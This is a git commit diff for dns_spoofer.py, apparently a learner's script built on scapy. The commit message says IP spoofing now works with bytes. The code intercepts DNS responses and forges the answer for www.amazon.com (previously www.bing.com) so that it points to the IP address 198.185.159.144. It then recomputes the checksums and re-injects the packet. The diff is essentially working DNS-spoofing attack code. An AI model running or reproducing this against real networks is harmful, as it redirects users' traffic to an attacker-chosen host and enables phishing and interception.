63b1ca7a627edb9eeff4c34fd1b625dd9d648a5e
Michael Zick <michaelzick@gmail.com>
2022-08-17 14:38:16 -0700

    Got ip spoof working with bytes

--- dns_spoofer.py
+++ dns_spoofer.py
@@ -7,8 +7,9 @@ import scapy.all as scapy
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
-        qname = scapy_packet[scapy.DNSQR].qname.decode()
-        if 'www.bing.com' in qname:
+        qname = scapy_packet[scapy.DNSQR].qname
+        print(qname)
+        if 'www.amazon.com' in qname.decode():
             print('[+] Spoofing target.')
             answer = scapy.DNSRR(rrname=qname, rdata='198.185.159.144')
             scapy_packet[scapy.DNS].an = answer
@@ -17,7 +18,7 @@ def process_packet(packet):
             del scapy_packet[scapy.IP].chksum
             del scapy_packet[scapy.UDP].len
             del scapy_packet[scapy.UDP].chksum
-            packet.set_payload(scapy_packet.decode())
+            packet.set_payload(bytes(scapy_packet))
     # packet.drop()
     packet.accept()
 
